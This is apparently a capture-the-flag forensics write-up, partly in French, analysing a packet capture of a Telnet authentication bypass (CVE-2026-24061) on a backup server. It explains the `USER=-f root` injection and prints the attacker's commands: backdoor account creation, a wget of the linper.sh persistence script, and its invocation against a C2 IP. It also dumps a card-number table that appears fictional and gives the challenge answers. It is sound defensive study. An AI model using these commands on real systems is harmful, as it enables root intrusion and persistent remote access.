---
tags:
  - writeup/htb
  - ctf
  - network-forensics
  - pcap-analysis
  - telnet
  - cve-2026-24061
  - incident-response
---

# Sherlock Scenario

You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.

### What CVE is associated with the vulnerability exploited in the Telnet protocol?
```shell

..%..&..... ..#..'..$..%..&..&........ ..#..'..$.. .....#.....'........... .38400,38400....#.kali:0.0....'..USER.-f root.DISPLAY.kali:0.0......XTERM-256COLOR.........."........!........"..".....b........b.... B.

........

............................0.......!.."......."......!............".."............. ..

........

.............

Linux 6.8.0-90-generic (backup-secondary) (pts/1)

```


La vulnérabilité CVE-2026-24061 vient d’un enchaînement très simple mais dangereux dans le fonctionnement de Telnet : normalement, quand un client se connecte, il doit saisir un nom d’utilisateur et un mot de passe, et le serveur appelle le programme système `/bin/login` pour vérifier ces informations. Mais Telnet possède aussi une fonctionnalité moins connue qui permet au client d’envoyer des variables d’environnement avant même l’authentification (via le mécanisme NEW-ENVIRON), par exemple `USER=admin`. Le problème est que certaines versions de `telnetd` transmettent directement la valeur de cette variable `USER` au programme `/bin/login` sans la filtrer. Or, sur Linux, le programme `login` accepte des options en ligne de commande : par exemple `-f root` signifie “connecter l’utilisateur root sans demander de mot de passe”. Du coup, un attaquant peut envoyer non pas un simple nom d’utilisateur, mais une valeur piégée comme `USER=-f root`. Le serveur Telnet va alors lancer en interne une commande équivalente à `login -f root`, croyant qu’il s’agit d’un nom d’utilisateur, mais le système l’interprète comme une option : l’authentification est alors complètement contournée et l’attaquant obtient directement un shell root, sans jamais fournir de mot de passe. Dans un PCAP, on ne verra donc pas de tentative de login classique (pas de “login:” ni de “password:”), mais plutôt cette variable `USER=-f root` envoyée pendant la phase de négociation Telnet, ce qui est le signe caractéristique de l’exploitation.

Réponse CVE-2026-24061
### When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?

```shell
╭─tximista at zaworudo in ~/Téléchargements/Telly 26-03-24 - 23:15:49  
╰─○ tshark -r monitoringservice_export_202610AM-11AM.pcapng -Y "frame.number == 52" -T fields -e frame.time     
Jan 27, 2026 11:39:28.319357980 CET
```

moins 1H en UTC réponse 2026-01-27 10:39:28




### What is the hostname of the targeted server?


```shell
╭─tximista at zaworudo in ~/Téléchargements/Telly 26-03-24 - 23:24:36  
╰─○ tshark -r monitoringservice_export_202610AM-11AM.pcapng -Y 'telnet' -T fields -e telnet.data | less

Linux 6.8.0-90-generic (backup-secondary) (pts/1)\r\n,\r\n  
  
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)\r\n,\r\n,  
SNIP__________________SNIP_________________________SNIP
root@backup-secondary:~#    
```

Réponse backup-secondary

### The attacker created a backdoor account to maintain future access. What username and password were set for that account?

```shell
╭─tximista at zaworudo in ~/Téléchargements/Telly 26-03-24 - 23:24:36  
╰─○ tshark -r monitoringservice_export_202610AM-11AM.pcapng -Y 'telnet' -T fields -e telnet.data | less

SNIP_____________________SNIP_______________________________SNIP
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
```

Réponse : cleanupsvc:YouKnowWhoiam69

### What was the full command the attacker used to download the persistence script?

```shell
╭─tximista at zaworudo in ~/Téléchargements/Telly 26-03-24 - 23:24:36  
╰─○ tshark -r monitoringservice_export_202610AM-11AM.pcapng -Y 'telnet' -T fields -e telnet.data | less
SNIP_____________________SNIP_______________________________SNIP
oot@backup-secondary: /tmp^Groot@backup-secondary:/tmp#    
w  
w  
g  
g  
e  
e  
t  
t  
   
   
https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh  
https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh  
\r

```

Réponse: wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh

### The attacker installed remote access persistence using the persistence script. What is the C2 IP address?


```shell
╭─tximista at zaworudo in ~/Téléchargements/Telly 26-03-24 - 23:24:36  
╰─○ tshark -r monitoringservice_export_202610AM-11AM.pcapng -Y 'telnet' -T fields -e telnet.data | less
SNIP_____________________SNIP_______________________________SNIP
root@backup-secondary:/tmp# .[Abash linper.sh --enum-defenses...[K...[K...[K...[K...[K...[K...[K...[K...[K...[K...[K...[K...[K...[Kii .[200~91.99.25.54.[201~.[7m91.99.25.54.[27m.[C............91.99.25.54 --pp 5599 ----sstteeaalltthh--mmooddee

```

Réponse: 91.99.25.54

The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?

```shell
╭─tximista at zaworudo in ~/Téléchargements/Telly 26-03-24 - 23:46:29  
╰─○ tshark -r monitoringservice_export_202610AM-11AM.pcapng -Y 'frame contains "GET /credit-cards-25-blackfriday.db"' -T fields -e frame.number -  
e frame.time  
9373    Jan 27, 2026 11:49:54.374956734 CET  
9377    Jan 27, 2026 11:49:54.376453873 CET
```
idem on enlève 1H ça lui a pris 10 minutes ;)
réponse: 2026-01-27 10:49:54

### Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.

```shell
─tximista at zaworudo in ~/Téléchargements/Telly 26-03-24 - 23:57:08  
╰─○ tshark -r monitoringservice_export_202610AM-11AM.pcapng --export-objects http,./tamere

[Mar 25, 2026 - 00:03:32 (CET)] exegol-ctf /workspace # sqlite3 ./tamere/credit-cards-25-blackfriday.db 

SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
purchases
sqlite> .schema
CREATE TABLE purchases (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT NOT NULL,
  creditcardnumber INTEGER NOT NULL,
  purchase_date TEXT NOT NULL,   -- ISO date: YYYY-MM-DD
  item_purchased TEXT NOT NULL
);
CREATE TABLE sqlite_sequence(name,seq);
sqlite> SELECT * FROM purchases;
1|alex.morgan@gmail.com|4539682995824395|2025-11-27|Wireless earbuds
2|sam.taylor@hotmail.com|5424187310928476|2025-11-28|Laptop
3|jordan.lee@gmail.com|4916738021459982|2025-11-29|Smartphone
4|casey.park@hotmail.com|5190026847315569|2025-11-30|Bluetooth speaker
5|taylor.chen@gmail.com|4023567190842237|2025-12-01|Smartwatch
6|morgan.ross@hotmail.com|5578129403617724|2025-12-02|Tablet
7|jamie.khan@gmail.com|4485123096741186|2025-12-03|USB-C hub
8|riley.patel@hotmail.com|5109346672819053|2025-12-04|External SSD
9|devon.ng@gmail.com|4670912384567021|2025-12-05|Gaming mouse
10|skyler.wong@hotmail.com|5234907812669348|2025-12-06|Mechanical keyboard
11|avery.singh@gmail.com|4147098863215504|2025-12-07|Noise-cancelling headphones
12|quinn.harris@hotmail.com|5312269047781209|2025-12-08|4K monitor
13|reese.clark@gmail.com|4019283746650197|2025-12-09|Portable charger
14|peyton.adams@hotmail.com|5561048937712906|2025-12-10|Wi-Fi router
15|harper.baker@gmail.com|4920187364501293|2025-12-11|Action camera
16|rowan.mills@hotmail.com|5408619927743018|2025-12-12|Drone
17|drew.evans@gmail.com|4638201947563317|2025-12-02|E-reader
18|logan.scott@hotmail.com|5207743198604425|2025-11-27|Smart home camera
19|kai.reed@gmail.com|4096127735501842|2025-12-06|Smart light bulbs
20|blake.turner@hotmail.com|5536901274485011|2025-11-30|VR headset
21|finley.hughes@gmail.com|4701832699047716|2025-12-01|Graphics tablet
22|river.ward@hotmail.com|5162087341196502|2025-12-09|Fitness tracker
23|charlie.diaz@gmail.com|4267091182306649|2025-12-03|Streaming stick
24|emerson.gray@hotmail.com|5478123065901147|2025-11-28|Portable projector
25|sage.brooks@gmail.com|4156609273184408|2025-12-10|Dash cam
26|cameron.bell@hotmail.com|5299001843765520|2025-12-04|Microphone
27|dakota.cooper@gmail.com|4381176029950315|2025-12-07|Webcam
28|marley.howard@hotmail.com|5523419876027783|2025-11-29|Surge protector power strip
29|phoenix.price@gmail.com|4619920371846650|2025-12-05|Electric toothbrush
30|jesse.ramos@hotmail.com|5183762094419087|2025-12-08|Raspberry Pi starter kit
sqlite> 



Réponse: 5312269047781209

```


## Attack Summary

The attacker exploited a Telnet authentication bypass (CVE-2026-24061) by abusing the `USER` environment variable to gain direct root access without credentials.

Once access was obtained, the attacker:

- created a backdoor account (`cleanupsvc`)
- downloaded a persistence script (`linper.sh`)
- established a C2 connection to `[91].[99].[25].[54]`
- exfiltrated a sensitive database (`credit-cards-25-blackfriday.db`)

The attack follows a classic pattern: **initial access → persistence → C2 → data exfiltration**

---

## Timeline

- **2026-01-27 10:39:28 UTC**  
    Telnet exploitation → root access obtained
- **Post-exploitation (same session)**
    - Backdoor account created: `cleanupsvc`
    - Password set via `chpasswd`
    - Persistence script downloaded via `wget`
- **C2 communication established**
    - IP: ``[91].[99].[25].[54]``
    - Reverse shell / persistence via `linper.sh`
- **2026-01-27 10:49:54 UTC**  
    Exfiltration of `credit-cards-25-blackfriday.db` over HTTP

---

## Threat Context

The attacker behavior is consistent with **hands-on-keyboard intrusion** rather than automated malware.

Observed techniques:

- Authentication bypass via Telnet misconfiguration
- Privilege access (root)
- Account creation for persistence
- Use of public post-exploitation tools (`linper.sh`)
- Data staging and exfiltration

The use of tools like credential harvesters and remote scripts suggests a **low-to-mid sophistication attacker**, likely focused on **data theft (financial information)**.

The presence of a credit card database indicates a clear objective:

> **financial gain via stolen sensitive data**

## Remediation

### Immediate containment

- Disable Telnet service on the affected host
- Isolate `backup-secondary` from the network
- Block outbound traffic to `91.99.25.54` at firewall level
- Terminate active attacker sessions (if still ongoing)

---

### Eradication

- Remove unauthorized account:
    - `cleanupsvc`
- Delete malicious or unknown files:
    - `/tmp/linper.sh`
    - any tools downloaded during the intrusion
- Verify persistence mechanisms (cron, services, SSH keys)

---

### Credential security

- Reset all local accounts passwords
- Rotate credentials potentially exposed:
    - system accounts
    - database credentials
- Invalidate any active sessions or tokens

---

### System recovery

- Rebuild the system from a trusted backup (preferred)
- If not possible:
    - perform full integrity check
    - validate all binaries and services
- Ensure no remaining backdoors or persistence

---

### Monitoring & detection

- Review logs for:
    - lateral movement
    - repeated access attempts
- Monitor for connections to:
    - `91.99.25.54` or related infrastructure
- Implement alerts for:
    - suspicious account creation
    - abnormal outbound traffic

---

### Long-term prevention

- Disable Telnet across all systems (use SSH only)
- Patch vulnerable services (CVE-2026-24061)
- Enforce strong authentication policies (MFA where possible)
- Apply least privilege principle
- Implement centralized logging and SIEM correlation
- Conduct security awareness (credential exposure risks)